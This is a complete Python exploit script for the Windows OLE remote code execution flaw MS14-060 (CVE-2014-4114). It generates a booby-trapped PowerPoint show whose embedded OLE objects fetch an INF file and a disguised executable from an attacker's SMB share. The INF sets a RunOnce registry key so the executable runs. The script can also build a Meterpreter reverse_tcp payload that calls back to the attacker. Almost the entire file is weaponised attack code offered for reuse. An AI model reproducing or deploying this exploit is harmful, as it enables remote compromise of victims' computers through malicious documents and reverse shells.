# !/usr/bin/python
# Windows OLE RCE Exploit MS14-060 (CVE-2014-4114)  Sandworm
# Author: Mike Czumak (T_v3rn1x) - @SecuritySift
# Written: 10/21/2014
# Tested Platform(s): Windows 7 SP1 (w/ exploit script run on Kali Linux)
# You are free to reuse this code in part or in whole with the exception of commercial applications
# For a demo of this PoC, see http://www.securitysift.com/windows-ole-rce-exploit-ms14-060/

import sys, os
import zipfile
import argparse
import subprocess
from shutil import copyfile
from pptx import Presentation 
 
# Args/Usage  
def get_args():
 
    parser = argparse.ArgumentParser( prog=\"ms14_060.py\",
                                      formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                                      epilog= \'\'\'This script will build a blank PowerPoint show (ppsx) file to exploit the
                                      OLE Remote Code Execution vulnerability identified as MS14-060 (CVE-2014-4114)
				                          Simply pass filename of resulting PPSX and IP Address of remote machine hosting the
				                          share. You can add content to the PPSX file after it has been created. 
                                      The script will also create the INF file and an optional Meterpreter
				                          reverse_tcp executable with the -m switch. Alternatively, you can host your own exectuble payload. 
                                      Host the INF and GIF (EXE) in an SMB share called \"share\".
                                      Note: Requires python-pptx\'\'\')
 
    parser.add_argument(\"filename\", help=\"Name of resulting PPSX exploit file\")
    parser.add_argument(\"ip\", help=\"IP Address of Remote machine hosting the share\")
    parser.add_argument(\"-m\", \"--msf\", help=\"Set if you want to create Meterpreter gif executable. Pass port (uses ip arg)\")
    args = parser.parse_args()
 
    return args
 
 
# write file
def write_file(filename, contents):
    f = open(filename, \"w\")
    f.write(contents)
    f.close()
 
# build bin
def build_bin(embed, ip, share, file): 
 
    bin = \"\\xD0\\xCF\\x11\\xE0\\xA1\\xB1\\x1A\\xE1\" # ole header
    bin = bin + \"\\x00\" * 16 
    bin = bin + \"\\x3E\\x00\\x03\\x00\\xFE\\xFF\\x09\\x00\"
    bin = bin + \"\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"
    bin = bin + \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"
    bin = bin + \"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"
    bin = bin + \"\\x00\\x10\\x00\\x00\\x02\\x00\\x00\\x00\"
    bin = bin + \"\\x01\\x00\\x00\\x00\\xFE\\xFF\\xFF\\xFF\"
    bin = bin + \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"
    bin = bin + \"\\xFF\" * 432
    bin = bin + \"\\xFD\\xFF\\xFF\\xFF\\xFE\\xFF\\xFF\\xFF\"
    bin = bin + \"\\xFE\\xFF\\xFF\\xFF\\xFE\\xFF\\xFF\\xFF\"
    bin = bin + \"\\xFF\" * 496
    bin = bin + \"\\x52\\x00\\x6F\\x00\\x6F\\x00\\x74\\x00\"
    bin = bin + \"\\x20\\x00\\x45\\x00\\x6E\\x00\\x74\\x00\"
    bin = bin + \"\\x72\\x00\\x79\\x00\\x00\\x00\\x00\\x00\"
    bin = bin + \"\\x00\" * 40
    bin = bin + \"\\x16\\x00\\x05\\x00\\xFF\\xFF\\xFF\\xFF\"
    bin = bin + \"\\xFF\\xFF\\xFF\\xFF\\x01\\x00\\x00\\x00\"
    bin = bin + \"\\x02\\x26\\x02\\x00\\x00\\x00\\x00\\x00\"
    bin = bin + \"\\xC0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\"
    bin = bin + \"\\x00\" * 12
    bin = bin + \"\\xF0\\x75\\xFD\\x41\\x63\\xB2\\xCF\\x01\"
    bin = bin + \"\\x03\\x00\\x00\\x00\\x40\\x00\\x00\\x00\"
    bin = bin + \"\\x00\\x00\\x00\\x00\\x01\\x00\\x4F\\x00\"
    bin = bin + \"\\x4C\\x00\\x45\\x00\\x31\\x00\\x30\\x00\"
    bin = bin + \"\\x4E\\x00\\x61\\x00\\x74\\x00\\x69\\x00\"
    bin = bin + \"\\x76\\x00\\x65\\x00\\x00\\x00\\x00\\x00\"
    bin = bin + \"\\x00\" * 36
    bin = bin + \"\\x1A\\x00\\x02\\x01\"
    bin = bin + \"\\xFF\" * 12
    bin = bin + \"\\x00\" * 40
    bin = bin + \"\\x37\"
    bin = bin + \"\\x00\" * 75
    bin = bin + \"\\xFF\" * 12
    bin = bin + \"\\x00\" * 116
    bin = bin + \"\\xFF\" * 12
    bin = bin + \"\\x00\" * 48
    bin = bin + \"\\xFE\"
    bin = bin + \"\\xFF\" * 511
    bin = bin + \"\\x33\\x00\\x00\\x00\" + embed + \"\\x00\" # 3   EmbeddedStgX.txt 
    bin = bin + \"\\x5C\\x5C\" + ip + \"\\x5C\" + share + \"\\x5C\" + file # \\\\ip\\share\\file    
    bin = bin + \"\\x00\" * 460
    return bin

# build ppt/drawings/vmlDrawing1.vml	
def build_vml():
    xml = \'<xml xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:p=\"urn:schemas-microsoft-com:office:powerpoint\" xmlns:oa=\"urn:schemas-microsoft-com:office:activation\">\'
    xml = xml + \'<o:shapelayout v:ext=\"edit\"><o:idmap v:ext=\"edit\" data=\"1\"/></o:shapelayout><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\'
    xml = xml + \'<v:stroke joinstyle=\"miter\"/><v:formulas><v:f eqn=\"if lineDrawn pixelLineWidth 0\"/><v:f eqn=\"sum @0 1 0\"/><v:f eqn=\"sum 0 0 @1\"/><v:f eqn=\"prod @2 1 2\"/><v:f eqn=\"prod @3 21600 pixelWidth\"/><v:f eqn=\"prod @3 21600 pixelHeight\"/><v:f eqn=\"sum @0 0 1\"/>\'
    xml = xml + \'<v:f eqn=\"prod @6 1 2\"/><v:f eqn=\"prod @7 21600 pixelWidth\"/><v:f eqn=\"sum @8 21600 0\"/><v:f eqn=\"prod @7 21600 pixelHeight\"/><v:f eqn=\"sum @10 21600 0\"/></v:formulas>\'
    xml = xml + \'<v:path o:extrusionok=\"f\" gradientshapeok=\"t\" o:connecttype=\"rect\"/><o:lock v:ext=\"edit\" aspectratio=\"t\"/></v:shapetype><v:shape id=\"_x0000_s1026\" type=\"#_x0000_t75\" style=\"position:absolute; left:100pt;top:-100pt;width:30pt;height:30pt\"><v:imagedata o:relid=\"rId1\" o:title=\"\"/></v:shape><v:shape id=\"_x0000_s1027\" type=\"#_x0000_t75\" style=\"position:absolute; left:150pt;top:-100pt;width:30pt;height:30pt\">\'
    xml = xml + \'<v:imagedata o:relid=\"rId2\" o:title=\"\"/></v:shape></xml>\'
    return xml
 
 # build ppt/slides/_rels/slide1.xml.rels
def build_xml_rels(ole1, ole2):
    xml = \'<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\'
    xml = xml + \'<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"../embeddings/\' + ole1 + \'\"/><Relationship Id=\"rId4\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"../embeddings/\' + ole2 + \'\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout\" Target=\"../slideLayouts/slideLayout1.xml\"/><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing\" Target=\"../drawings/vmlDrawing1.vml\"/></Relationships>\'  
    return xml
 
def build_xml_slide1():
    xml = \'<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\'
    xml = xml + \'<p:sld xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\" xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\"><p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id=\"1\" name=\"\"/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr><a:xfrm><a:off x=\"0\" y=\"0\"/><a:ext cx=\"0\" cy=\"0\"/><a:chOff x=\"0\" y=\"0\"/><a:chExt cx=\"0\" cy=\"0\"/></a:xfrm></p:grpSpPr><p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id=\"4\" name=\"Object 3\"/><p:cNvGraphicFramePr><a:graphicFrameLocks noChangeAspect=\"1\"/></p:cNvGraphicFramePr><p:nvPr/></p:nvGraphicFramePr><p:xfrm><a:off x=\"1270000\" y=\"-1270000\"/><a:ext cx=\"381000\" cy=\"381000\"/></p:xfrm><a:graphic><a:graphicData uri=\"http://schemas.openxmlformats.org/presentationml/2006/ole\"><p:oleObj spid=\"_x0000_s1026\" name=\"Packager Shell Object\" r:id=\"rId3\" imgW=\"850320\" imgH=\"686880\" progId=\"\"><p:embed/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame><p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id=\"5\" name=\"Object 4\"/><p:cNvGraphicFramePr><a:graphicFrameLocks noChangeAspect=\"1\"/></p:cNvGraphicFramePr><p:nvPr/></p:nvGraphicFramePr><p:xfrm><a:off x=\"1905000\" y=\"-1270000\"/><a:ext cx=\"381000\" cy=\"381000\"/></p:xfrm><a:graphic><a:graphicData uri=\"http://schemas.openxmlformats.org/presentationml/2006/ole\"><p:oleObj spid=\"_x0000_s1027\" name=\"Packager Shell Object\" r:id=\"rId4\" imgW=\"850320\" imgH=\"686880\" progId=\"\"><p:embed/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame></p:spTree></p:cSld><p:clrMapOvr><a:masterClrMapping/></p:clrMapOvr><p:transition><p:zoom/></p:transition><p:timing><p:tnLst><p:par><p:cTn id=\"1\" dur=\"indefinite\" restart=\"never\" nodeType=\"tmRoot\"><p:childTnLst><p:seq concurrent=\"1\" nextAc=\"seek\"><p:cTn id=\"2\" dur=\"indefinite\" nodeType=\"mainSeq\"><p:childTnLst><p:par><p:cTn id=\"3\" fill=\"hold\"><p:stCondLst><p:cond delay=\"indefinite\"/><p:cond evt=\"onBegin\" delay=\"0\"><p:tn val=\"2\"/></p:cond></p:stCondLst><p:childTnLst><p:par><p:cTn id=\"4\" fill=\"hold\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst><p:childTnLst><p:par><p:cTn id=\"5\" presetID=\"11\" presetClass=\"entr\" presetSubtype=\"0\" fill=\"hold\" nodeType=\"withEffect\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst><p:childTnLst><p:set><p:cBhvr><p:cTn id=\"6\" dur=\"1000\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid=\"4\"/></p:tgtEl><p:attrNameLst><p:attrName>style.visibility</p:attrName></p:attrNameLst></p:cBhvr><p:to><p:strVal val=\"visible\"/></p:to></p:set></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par><p:par><p:cTn id=\"7\" fill=\"hold\"><p:stCondLst><p:cond delay=\"1000\"/></p:stCondLst><p:childTnLst><p:par><p:cTn id=\"8\" presetID=\"11\" presetClass=\"entr\" presetSubtype=\"0\" fill=\"hold\" nodeType=\"afterEffect\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst><p:childTnLst><p:set><p:cBhvr><p:cTn id=\"9\" dur=\"1000\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid=\"4\"/></p:tgtEl><p:attrNameLst><p:attrName>style.visibility</p:attrName></p:attrNameLst></p:cBhvr><p:to><p:strVal val=\"visible\"/></p:to></p:set><p:cmd type=\"verb\" cmd=\"-3\"><p:cBhvr><p:cTn id=\"10\" dur=\"1000\" fill=\"hold\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid=\"4\"/></p:tgtEl></p:cBhvr></p:cmd></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par><p:par><p:cTn id=\"11\" fill=\"hold\"><p:stCondLst><p:cond delay=\"2000\"/></p:stCondLst><p:childTnLst><p:par><p:cTn id=\"12\" presetID=\"11\" presetClass=\"entr\" presetSubtype=\"0\" fill=\"hold\" nodeType=\"afterEffect\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst><p:childTnLst><p:set><p:cBhvr><p:cTn id=\"13\" dur=\"1000\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid=\"5\"/></p:tgtEl><p:attrNameLst><p:attrName>style.visibility</p:attrName></p:attrNameLst></p:cBhvr><p:to><p:strVal val=\"visible\"/></p:to></p:set><p:cmd type=\"verb\" cmd=\"3\"><p:cBhvr><p:cTn id=\"14\" dur=\"1000\" fill=\"hold\"><p:stCondLst><p:cond delay=\"0\"/></p:stCondLst></p:cTn><p:tgtEl><p:spTgt spid=\"5\"/></p:tgtEl></p:cBhvr></p:cmd></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn></p:par></p:childTnLst></p:cTn><p:prevCondLst><p:cond evt=\"onPrev\" delay=\"0\"><p:tgtEl><p:sldTgt/></p:tgtEl></p:cond></p:prevCondLst><p:nextCondLst><p:cond evt=\"onNext\" delay=\"0\"><p:tgtEl><p:sldTgt/></p:tgtEl></p:cond></p:nextCondLst></p:seq></p:childTnLst></p:cTn></p:par></p:tnLst></p:timing></p:sld>\'
    return xml

# build [Content_Types].xml	
def build_xml_content_types():
    xml = \'<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\'
    xml = xml + \'<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"xml\" ContentType=\"application/xml\"/><Default Extension=\"jpeg\" ContentType=\"image/jpeg\"/><Default Extension=\"bin\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.printerSettings\"/><Default Extension=\"vml\" ContentType=\"application/vnd.openxmlformats-officedocument.vmlDrawing\"/><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"wmf\" ContentType=\"image/x-wmf\"/><Override PartName=\"/ppt/presentation.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml\"/><Override PartName=\"/ppt/slideMasters/slideMaster1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml\"/><Override PartName=\"/ppt/slides/slide1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slide+xml\"/><Override PartName=\"/ppt/presProps.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.presProps+xml\"/><Override PartName=\"/ppt/viewProps.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.viewProps+xml\"/><Override PartName=\"/ppt/theme/theme1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.theme+xml\"/><Override PartName=\"/ppt/tableStyles.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.tableStyles+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout2.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout3.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout4.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout5.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout6.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout7.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout8.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout9.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout10.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/slideLayouts/slideLayout11.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml\"/><Override PartName=\"/ppt/embeddings/oleObject1.bin\" ContentType=\"application/vnd.openxmlformats-officedocument.oleObject\"/><Override PartName=\"/ppt/embeddings/oleObject2.bin\" ContentType=\"application/vnd.openxmlformats-officedocument.oleObject\"/><Override PartName=\"/docProps/core.xml\" ContentType=\"application/vnd.openxmlformats-package.core-properties+xml\"/><Override PartName=\"/docProps/app.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.extended-properties+xml\"/></Types>\'
 
    return xml
	
# build remotely hosted inf file 
def build_inf(gif):
    exe = gif.split(\'.\')[0] + \'.exe\'
    inf = \'[Version]\\n\'
    inf = inf + \'Signature = \"$CHICAGO$\"\\n\'
    inf = inf + \'Class=61883\\n\'
    inf = inf + \'ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17}\\n\'
    inf = inf + \'Provider=%Microsoft%\\n\'
    inf = inf + \'DriverVer=06/21/2006,6.1.7600.16385\\n\'
    inf = inf + \'[DestinationDirs]\\n\'
    inf = inf + \'DefaultDestDir = 1\\n\'
    inf = inf + \'[DefaultInstall]\\n\'
    inf = inf + \'RenFiles = RxRename\\n\'
    inf = inf + \'AddReg = RxStart\\n\'
    inf = inf + \'[RxRename]\\n\'
    inf = inf + exe + \', \' + gif + \'\\n\'
    inf = inf + \'[RxStart]\\n\'
    inf = inf + \'HKLM,Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce,Install,,%1%\\\\\' + exe
 
    return inf

# build blank pptx file with python-pptx	
def build_presentation(filename):
    prs = Presentation()
    slide_layout = prs.slide_layouts[6] # blank slide
    slide = prs.slides.add_slide(slide_layout)
    prs.save(filename)
    return

# build metasploit meterpreter reverse_tcp payload	
def build_msfpayload(ip, port, file):
    cmd = \'msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s\' % (ip, port, file)
    run_cmd= subprocess.check_output(cmd, shell=True)
    subprocess.call(run_cmd, shell=True)
    print \'[*] Meterpreter Reverse TCP EXE [%s] created.\' % (file)
 
    
#################################################
###############        Main       ###############
#################################################
 
def main():
    print
    print \'=============================================================================\'
    print \'|    PowerPoint OLE Remote Code Execution (MS14-060 | CVE-2014-4114)        |\'
    print \'|               Author: Mike Czumak (T_v3rn1x) - @SecuritySift              |\' 
    print \'=============================================================================\\n\'
	
    args = get_args() # get the cl args 
    ip = args.ip 
    share = \"share\"
    ole1 = \"oleObject1.bin\"
    ole2 = \"oleObject2.bin\"
    vml = \"vmlDrawing1.vml\"
    pptx = \"tmp.pptx\"
    gif = \"slide1.gif\"
    inf = \"slides.inf\"
    
    # build meterpreter reverse tcp gif file (optional)
    if args.msf:
        print \"[i] Building metasploit reverse_tcp executable\"
        build_msfpayload(args.ip, args.msf, gif)
 
    # build the bin, inf and vml files
    gif_bin = build_bin(\"EmbeddedStg1.txt\", ip, share, gif)
    inf_bin = build_bin(\"EmbeddedStg2.txt\", ip, share, inf)
    draw_vml = build_vml()
    rem_inf = build_inf(gif)
    write_file(inf, rem_inf)
    print (\"[*] INF file [%s] created \" % inf)
 
    # build the xml files
    xml_rel = build_xml_rels(ole1, ole2)
    xml_slide1 = build_xml_slide1()
    xml_content = build_xml_content_types()
 
    # build blank temp pptx presentation to convert to ppsx
    build_presentation(pptx)
    zippptx = pptx + \".zip\"
    os.rename(pptx, zippptx) # rename to zip for modification
    
    # open temp pptx and a copy for modification
    zin = zipfile.ZipFile(zippptx, \'r\')
    zippptx_copy = \"copy_\" + zippptx
    zout = zipfile.ZipFile(zippptx_copy, \"w\")
 
    # modify the pptx template with exploit
    for item in zin.infolist():
        if (item.filename == \"ppt/slides/slide1.xml\"): 
            zout.writestr(item, xml_slide1) # replace slide 1 contents
        elif (item.filename == \"ppt/slides/_rels/slide1.xml.rels\"):
            zout.writestr(item, xml_rel) # replace slide 1 rels
        elif (item.filename == \"[Content_Types].xml\"):
            zout.writestr(item, xml_content) # replace content_types
        else:
            buffer = zin.read(item.filename) 
            zout.writestr(item,buffer) # use existing file
    
    zout.writestr(\"ppt/embeddings/\" + ole1, gif_bin)
    zout.writestr(\"ppt/embeddings/\"+ole2, inf_bin)
    zout.writestr(\"ppt/drawings/vmlDrawing1.vml\", draw_vml)
    zout.close()
    zin.close()
    
    # convert to ppsx
    os.rename(zippptx_copy, args.filename)
    os.remove(zippptx)
    
    print (\"[*] Exploit PPSX file [%s] created\" % (args.filename))		
    print (\"[i] Place INF and GIF (EXE) payload file (called %s) in an SMB share called \'share\'\" % (gif))		
    print
 
if __name__ == \'__main__\':
	main()